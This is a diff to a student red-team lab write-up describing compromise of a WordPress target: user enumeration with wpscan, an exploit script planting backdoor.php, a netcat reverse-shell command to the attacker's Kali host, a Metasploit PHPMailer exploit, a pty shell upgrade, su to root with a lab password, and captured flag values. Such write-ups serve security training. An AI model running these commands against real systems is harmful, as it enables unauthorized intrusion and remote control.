@@ -1,5 +1,5 @@
 # Final-Project
-# Read Team: Summary of Operations
+# Red Team: Summary of Operations
 
 
 ### Network Scan
@@ -59,8 +59,8 @@ This scan identifies the services below as potential points of entry:
  ![wpscan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/wpscan.png "wpscan results")
 
 Identified following users with wpscan:
-  - - Steven
-  - - Michael
+   - Steven
+   - Michael
   
   ![users results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/users.png "users results")
 
@@ -170,7 +170,7 @@ Once escalated to root
            - `cat flag4.txt`
 
 - **Flag4: 715dea6c055b9fe3337544932f2941ce**
-- 
+
 
        
 ![Flag 4 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag4.png "Flag 4")
@@ -224,7 +224,7 @@ Edited the line at the top of the exploit.sh script to set the `TARGET`variable.
 
 Ran the script. It uploaded a file called backdoor.php to the target server. This file was used to execute command injection attack by opening an Ncat connection to the Kali VM.
 
-![exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploit.png "exploit")   
+![exploit](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/exploitsh.png "exploit")   
 
 
 
@@ -246,7 +246,9 @@ In the browser, used the backdoor to run:
 
 nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.
     
-    ![listener1](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener1")   
+   ![listenerbackdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listenerbackdoor.png "listener")     
+    
+ ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   
 
 Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
     
@@ -255,12 +257,39 @@ Command: `find /var/www -type f -iname 'flag*' `
 ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3command.png "flag3")     
 
 Opened the flag in the browser window.
-http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png.
+`http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
+   
     **Flag3**
     
   ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3target2.png "flag3")     
 
+Used Metasploit options for a successful attack against phpmailer.
+Got a meterpreter shell from the vulnerable machine.
+The PHPMailer exploit is fairly straightforward. CVE-2016-10045 describes the details of the vulnerability. 
 
+    ![msfconsole](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/msfconsole.png "msfconsole")   
+    
+    Used option 1 and got access to the mailer.
+    
+ ![mailer](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mailer.png "mailer")   
+    
+    Used the python script and su root to escalate the privilges to the root user.
 
-
-
+     - ` python -c 'import pty;pty.spawn("/bin/bash")' `
+     -  `su root`
+     - `passwd:toor'
+    
+   ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag4target2.png "flag4")    
+    
+    Got root access to traget to, via directory traversal accessed the flag 4.
+    
+    ** Flag4 **
+    - 'cat flag4.txt`
+    
+    ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/catflag4.png "flag4")    
+    
+    
+    
+    
+    
+    
